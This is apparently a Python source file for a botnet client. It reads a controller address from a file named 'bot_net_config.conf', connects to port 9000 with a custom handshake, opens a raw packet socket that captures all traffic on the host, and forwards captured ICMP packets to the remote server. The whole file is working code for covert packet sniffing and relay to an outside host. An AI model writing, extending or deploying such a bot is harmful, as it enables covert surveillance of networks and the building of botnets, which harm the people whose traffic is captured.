from data_parser import *
import socket
import re
import logging


class SETTINGS_BOT():

    def __init__(self):
        logging.basicConfig(level=logging.DEBUG)
        server_ip, host_ip,host_mask =SETTINGS_BOT.get_config_settings(self)
        SETTINGS_BOT.connect_to_server(self,server_ip,host_ip)

    def get_config_settings(self):
        try:
            config_file = open("bot_net_config.conf",'r')
            settings_bot = config_file.read()
            server_ip = re.findall(r'ip_server-(.*)',settings_bot)
            host_ip = re.findall(r'ip_host-(.*)',settings_bot)
            host_mask = re.findall(r'host_mask-(.*)',settings_bot)
        except IOError:
            logging.error("Error open config file")
        finally:
            config_file.close()

        return server_ip,host_ip,host_mask

    def connect_to_server(self,server_ip,host_ip):
        bot_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        bot_socket.connect((server_ip[0],9000))
        SYN_data = bytes(server_ip[0]+":CONNECT:SYN",encoding='utf-8')
        bot_socket.sendall(SYN_data)
        ACK_data = bot_socket.recv(1024)
        ACK_data1 = bot_socket.recv(1024)
        if ACK_data != b'':
        # if ACK_data == bytes(server_ip[0]+":CONNECT:ACK",encoding='utf-8'):
            logging.info("BOT START %r",bot_socket)
            logging.info("STARTING SNIFF NETWORK", ACK_data)
            SNIFFER(bot_socket)

class SNIFFER(object):

    def __init__(self, bot_socket):
        sniff_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        while True:
            data, address = sniff_socket.recvfrom(65535)
            header_packet = PARSER.start_parser(data)
            print(header_packet)
            if header_packet["3L"]["Protocol_type"] == 1:
                bot_socket.sendall(data)


if __name__ == "__main__":
    bot = SETTINGS_BOT()